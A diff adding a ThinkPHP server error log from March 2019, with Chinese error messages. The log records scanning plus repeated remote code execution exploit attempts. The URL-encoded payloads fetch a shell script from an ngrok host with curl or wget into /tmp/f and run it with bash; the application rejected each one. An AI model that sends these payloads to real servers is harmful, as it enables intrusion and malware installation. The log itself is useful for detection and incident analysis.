@@ -1,0 +1,129 @@
+[ 2019-03-01T08:37:24+08:00 ] 190.188.94.38 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2019-03-01T08:40:23+08:00 ] 190.188.94.38 /manager/html
+ERR: 无法加载控制器:Manager
+
+[ 2019-03-01T11:41:13+08:00 ] 177.18.196.112 /?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=%28curl+--connect-timeout+3+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh+-o+%2Ftmp%2Ff+%26+wget+-O+%2Ftmp%2Ff+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh%29
+ERR: 非法操作:\think\app
+
+[ 2019-03-01T11:41:13+08:00 ] 177.18.196.112 /?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=%2Fbin%2Fbash+%2Ftmp%2Ff
+ERR: 非法操作:\think\app
+
+[ 2019-03-01T11:41:14+08:00 ] 177.18.196.112 /public/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=%28curl+--connect-timeout+3+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh+-o+%2Ftmp%2Ff+%26+wget+-O+%2Ftmp%2Ff+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh%29
+ERR: 非法操作:\think\Container
+
+[ 2019-03-01T11:41:14+08:00 ] 177.18.196.112 /public/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=%2Fbin%2Fbash+%2Ftmp%2Ff
+ERR: 非法操作:\think\Container
+
+[ 2019-03-01T11:41:14+08:00 ] 177.18.196.112 /public/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=%28curl+--connect-timeout+3+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh+-o+%2Ftmp%2Ff+%26+wget+-O+%2Ftmp%2Ff+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh%29
+ERR: 非法操作:\think\app
+
+[ 2019-03-01T11:41:15+08:00 ] 177.18.196.112 /public/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=%2Fbin%2Fbash+%2Ftmp%2Ff
+ERR: 非法操作:\think\app
+
+[ 2019-03-01T11:41:15+08:00 ] 177.18.196.112 /?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=%28curl+--connect-timeout+3+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh+-o+%2Ftmp%2Ff+%26+wget+-O+%2Ftmp%2Ff+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh%29
+ERR: 非法操作:\think\Container
+
+[ 2019-03-01T11:41:17+08:00 ] 177.18.196.112 /?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=%2Fbin%2Fbash+%2Ftmp%2Ff
+ERR: 非法操作:\think\Container
+
+[ 2019-03-01T11:41:17+08:00 ] 177.18.196.112 /?s=index/\think\Request/input&filter=shell_exec&data=%28curl+--connect-timeout+3+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh+-o+%2Ftmp%2Ff+%26+wget+-O+%2Ftmp%2Ff+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh%29
+ERR: 非法操作:\think\Request
+
+[ 2019-03-01T11:41:18+08:00 ] 177.18.196.112 /?s=index/\think\Request/input&filter=shell_exec&data=%2Fbin%2Fbash+%2Ftmp%2Ff
+ERR: 非法操作:\think\Request
+
+[ 2019-03-01T11:41:18+08:00 ] 177.18.196.112 /?s=index/\think\view\driver\Php/display&content=%3C%3Fphp+shell_exec%28%22%28curl+--connect-timeout+3+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh+-o+%2Ftmp%2Ff+%26+wget+-O+%2Ftmp%2Ff+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh%29%22%29%3B+%3F%3E
+ERR: 非法操作:\think\view\driver\Php
+
+[ 2019-03-01T11:41:19+08:00 ] 177.18.196.112 /?s=index/\think\view\driver\Php/display&content=%3C%3Fphp+shell_exec%28%22%2Fbin%2Fbash+%2Ftmp%2Ff%22%29%3B+%3F%3E
+ERR: 非法操作:\think\view\driver\Php
+
+[ 2019-03-01T11:41:19+08:00 ] 177.18.196.112 /?s=index/\think\View/display&content=%3C%3Fphp+shell_exec%28%22%28curl+--connect-timeout+3+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh+-o+%2Ftmp%2Ff+%26+wget+-O+%2Ftmp%2Ff+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh%29%22%29%3B+%3F%3E&data=1
+ERR: 非法操作:\think\View
+
+[ 2019-03-01T11:41:19+08:00 ] 177.18.196.112 /?s=index/\think\View/display&content=%3C%3Fphp+shell_exec%28%22%2Fbin%2Fbash+%2Ftmp%2Ff%22%29%3B+%3F%3E&data=1
+ERR: 非法操作:\think\View
+
+[ 2019-03-01T11:41:20+08:00 ] 177.18.196.112 /index.php?s=captcha
+ERR: 无法加载控制器:Captcha
+
+[ 2019-03-01T11:41:20+08:00 ] 177.18.196.112 /index.php?s=captcha
+ERR: 无法加载控制器:Captcha
+
+[ 2019-03-01T11:41:21+08:00 ] 177.18.196.112 /index.php?s=captcha
+ERR: 无法加载控制器:Captcha
+
+[ 2019-03-01T11:41:21+08:00 ] 177.18.196.112 /?s=captcha
+ERR: 无法加载控制器:Captcha
+
+[ 2019-03-01T11:41:22+08:00 ] 177.18.196.112 /?s=captcha
+ERR: 无法加载控制器:Captcha
+
+[ 2019-03-01T11:41:22+08:00 ] 177.18.196.112 /?s=captcha
+ERR: 无法加载控制器:Captcha
+
+[ 2019-03-01T11:47:02+08:00 ] 177.18.196.112 /?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=%28curl+--connect-timeout+3+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh+-o+%2Ftmp%2Ff+%26+wget+-O+%2Ftmp%2Ff+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh%29
+ERR: 非法操作:\think\app
+
+[ 2019-03-01T11:47:03+08:00 ] 177.18.196.112 /?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=%2Fbin%2Fbash+%2Ftmp%2Ff
+ERR: 非法操作:\think\app
+
+[ 2019-03-01T11:47:03+08:00 ] 177.18.196.112 /public/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=%28curl+--connect-timeout+3+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh+-o+%2Ftmp%2Ff+%26+wget+-O+%2Ftmp%2Ff+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh%29
+ERR: 非法操作:\think\Container
+
+[ 2019-03-01T11:47:04+08:00 ] 177.18.196.112 /public/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=%2Fbin%2Fbash+%2Ftmp%2Ff
+ERR: 非法操作:\think\Container
+
+[ 2019-03-01T11:47:04+08:00 ] 177.18.196.112 /public/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=%28curl+--connect-timeout+3+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh+-o+%2Ftmp%2Ff+%26+wget+-O+%2Ftmp%2Ff+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh%29
+ERR: 非法操作:\think\app
+
+[ 2019-03-01T11:47:05+08:00 ] 177.18.196.112 /public/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=%2Fbin%2Fbash+%2Ftmp%2Ff
+ERR: 非法操作:\think\app
+
+[ 2019-03-01T11:47:05+08:00 ] 177.18.196.112 /?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=%28curl+--connect-timeout+3+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh+-o+%2Ftmp%2Ff+%26+wget+-O+%2Ftmp%2Ff+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh%29
+ERR: 非法操作:\think\Container
+
+[ 2019-03-01T11:47:05+08:00 ] 177.18.196.112 /?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=%2Fbin%2Fbash+%2Ftmp%2Ff
+ERR: 非法操作:\think\Container
+
+[ 2019-03-01T11:47:06+08:00 ] 177.18.196.112 /?s=index/\think\Request/input&filter=shell_exec&data=%28curl+--connect-timeout+3+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh+-o+%2Ftmp%2Ff+%26+wget+-O+%2Ftmp%2Ff+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh%29
+ERR: 非法操作:\think\Request
+
+[ 2019-03-01T11:47:06+08:00 ] 177.18.196.112 /?s=index/\think\Request/input&filter=shell_exec&data=%2Fbin%2Fbash+%2Ftmp%2Ff
+ERR: 非法操作:\think\Request
+
+[ 2019-03-01T11:47:07+08:00 ] 177.18.196.112 /?s=index/\think\view\driver\Php/display&content=%3C%3Fphp+shell_exec%28%22%28curl+--connect-timeout+3+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh+-o+%2Ftmp%2Ff+%26+wget+-O+%2Ftmp%2Ff+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh%29%22%29%3B+%3F%3E
+ERR: 非法操作:\think\view\driver\Php
+
+[ 2019-03-01T11:47:07+08:00 ] 177.18.196.112 /?s=index/\think\view\driver\Php/display&content=%3C%3Fphp+shell_exec%28%22%2Fbin%2Fbash+%2Ftmp%2Ff%22%29%3B+%3F%3E
+ERR: 非法操作:\think\view\driver\Php
+
+[ 2019-03-01T11:47:08+08:00 ] 177.18.196.112 /?s=index/\think\View/display&content=%3C%3Fphp+shell_exec%28%22%28curl+--connect-timeout+3+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh+-o+%2Ftmp%2Ff+%26+wget+-O+%2Ftmp%2Ff+http%3A%2F%2Fe52bf82b.ngrok.io%2Ftest.sh%29%22%29%3B+%3F%3E&data=1
+ERR: 非法操作:\think\View
+
+[ 2019-03-01T11:47:08+08:00 ] 177.18.196.112 /?s=index/\think\View/display&content=%3C%3Fphp+shell_exec%28%22%2Fbin%2Fbash+%2Ftmp%2Ff%22%29%3B+%3F%3E&data=1
+ERR: 非法操作:\think\View
+
+[ 2019-03-01T11:47:09+08:00 ] 177.18.196.112 /index.php?s=captcha
+ERR: 无法加载控制器:Captcha
+
+[ 2019-03-01T11:47:09+08:00 ] 177.18.196.112 /index.php?s=captcha
+ERR: 无法加载控制器:Captcha
+
+[ 2019-03-01T11:47:10+08:00 ] 177.18.196.112 /index.php?s=captcha
+ERR: 无法加载控制器:Captcha
+
+[ 2019-03-01T11:47:10+08:00 ] 177.18.196.112 /?s=captcha
+ERR: 无法加载控制器:Captcha
+
+[ 2019-03-01T11:47:10+08:00 ] 177.18.196.112 /?s=captcha
+ERR: 无法加载控制器:Captcha
+
+[ 2019-03-01T11:47:11+08:00 ] 177.18.196.112 /?s=captcha
+ERR: 无法加载控制器:Captcha
+
+[ 2019-03-01T18:58:22+08:00 ] 185.53.88.24 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
